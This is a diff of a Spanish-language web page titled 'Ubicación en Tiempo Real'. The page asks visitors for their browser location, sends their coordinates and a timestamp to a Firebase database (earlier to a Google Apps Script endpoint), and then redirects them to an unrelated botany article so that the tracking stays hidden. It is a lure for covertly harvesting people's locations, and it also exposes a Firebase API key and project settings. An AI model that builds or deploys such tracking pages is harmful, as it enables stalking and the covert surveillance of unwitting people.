@@ -3,37 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Obteniendo Ubicación...</title>
-    <script>
-        async function obtenerUbicacion() {
+    <title>Ubicación en Tiempo Real</title>
+    <script type="module">
+        // Importar Firebase
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-app.js";
+        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-database.js";
+
+        // Configuración de Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyDo4j7zm_poOFz5tRUkRULjxrZO2jlOuaM",
+            authDomain: "ubicacionesweb.firebaseapp.com",
+            databaseURL: "https://ubicacionesweb-default-rtdb.firebaseio.com",
+            projectId: "ubicacionesweb",
+            storageBucket: "ubicacionesweb.firebasestorage.app",
+            messagingSenderId: "916561063858",
+            appId: "1:916561063858:web:316104fb181e9377fabeab"
+        };
+
+        // Inicializar Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        // Función para obtener ubicación
+        function obtenerUbicacion() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    async function(position) {
+                    function(position) {
                         let lat = position.coords.latitude;
                         let lon = position.coords.longitude;
-                        console.log("Latitud:", lat);
-                        console.log("Longitud:", lon);
+                        let timestamp = new Date().toLocaleString();
 
-                        try {
-                            // Enviar ubicación a Google Apps Script
-                            let respuesta = await fetch("https://script.google.com/macros/s/AKfycbw6HEcn1ON-IbGw9TZ8oNlswvaU1SNinXLXsunyVv4ZQuX-JulEoN-GZJvr86WCWtZw/exec", {
-                                method: "POST",
-                                headers: { "Content-Type": "application/json" },
-                                body: JSON.stringify({ latitud: lat, longitud: lon })
-                            });
+                        // Guardar en Firebase
+                        push(ref(database, "ubicaciones"), {
+                            latitud: lat,
+                            longitud: lon,
+                            fecha: timestamp
+                        }).then(() => {
+                            console.log("Ubicación guardada en Firebase:", lat, lon);
+                        }).catch(error => {
+                            console.error("Error al guardar ubicación:", error);
+                        });
 
-                            let textoRespuesta = await respuesta.text();
-                            console.log("Respuesta del servidor:", textoRespuesta);
-
-                        } catch (error) {
-                            console.error("Error al enviar datos:", error);
-                        }
-
-                        // Redirigir después de enviar la ubicación
-                        window.location.href = "https://concepto.de/botanica/"; // Cambia por tu URL destino
+                        // Redirigir a otra página
+                        window.location.href = "https://concepto.de/botanica/";
                     },
                     function(error) {
-                        alert("Activa la ubicación en tu navegador.");
+                        alert("Debes permitir el acceso a la ubicación.");
                     }
                 );
             } else {
